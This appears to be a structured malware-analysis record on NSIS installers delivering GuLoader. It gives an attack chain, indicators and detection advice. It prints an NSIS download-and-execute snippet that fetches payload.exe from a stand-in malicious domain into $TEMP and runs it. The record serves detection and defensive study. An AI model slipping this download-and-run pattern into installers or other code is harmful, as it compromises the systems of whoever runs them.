package_info.package_manager: N/A (malware distributed as NSIS installer, not a package manager)
package_info.why_malicious: The NSIS executables are used as a delivery mechanism for GuLoader malware, which is designed to download and execute additional malicious payloads, enabling further compromise of targeted systems in the e-commerce sector.

malicious_snippets.code_snippet: System::Call 'kernel32::URLDownloadToFileA(i 0, t "http://malicious-domain.com/payload.exe", t "$TEMP\payload.exe", i 0, i 0)' ExecWait '$TEMP\payload.exe'
malicious_snippets.code_behavior: At runtime, the code downloads an additional executable from a remote server and executes it, enabling the delivery of further malware payloads.

malice_analysis.why_suspicious: Downloading and executing remote code is a classic malware delivery technique, especially when performed by an installer that masquerades as a legitimate file.
malice_analysis.violated_expectations: Normal NSIS installers should only install legitimate application files, not fetch and execute arbitrary code from the internet.
malice_analysis.similar_legitimate_use: Legitimate updaters may download updates, but should verify signatures and not execute untrusted code.
key_indicators: No user notification or consent for network activity

attack_chain.action: User receives and executes a malicious NSIS installer, believing it to be a legitimate file.
attack_chain.leads_to: Malware downloads and executes additional payloads, leading to system compromise.

attack_chain.action: Downloaded payload (GuLoader) establishes persistence and/or downloads further malware (e.g., RATs, stealers).
attack_chain.leads_to: Full compromise of the victim system, data exfiltration, or further lateral movement.

behavioral_signatures: NSIS installer downloading and executing remote executables
Unexpected network connections from installer processes
Execution of files from temporary directories immediately after download
file_indicators: NSIS installer files with embedded URLDownloadToFileA calls
Executables dropped to $TEMP or similar directories
Unexpected NSIS installers received via email
network_indicators: Connections to known malicious domains or IPs used for payload delivery
Unusual outbound HTTP/HTTPS requests from installer processes
detection_knowledge.how_to_detect: Monitor for NSIS installer processes that initiate outbound network connections and download executables, especially when the destination is a non-corporate or suspicious domain. Flag installers that execute files from temporary directories immediately after download. Use sandboxing to analyze installer behavior and inspect for embedded download-and-execute logic.
